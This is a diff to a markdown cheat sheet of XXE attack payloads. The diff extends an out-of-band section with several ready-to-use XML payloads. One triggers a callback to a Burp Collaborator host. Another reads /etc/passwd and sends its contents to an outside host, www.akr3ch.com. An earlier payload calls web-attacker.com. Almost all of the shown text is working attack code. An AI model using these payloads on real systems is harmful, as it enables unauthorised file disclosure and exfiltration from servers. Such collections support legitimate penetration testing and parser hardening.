@@ -519,9 +519,26 @@ If the output of the `win.ini` file on the target returns the response message, 
 </userInfo>
 ```
 
-### XXE - Out-of-band
+### XXE - Out-of-band - payloads
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+```
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
+]>
+```
+##### Send the content of `/etc/passwd` to `www.akr3ch.com`, you may receive only the first line.
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callme SYSTEM "www.akr3ch.com/?%xxe;">
+]
+>
+<foo>&callme;</foo>
 ```
 
 ### XXE file read via XInclude payload as parameter value 
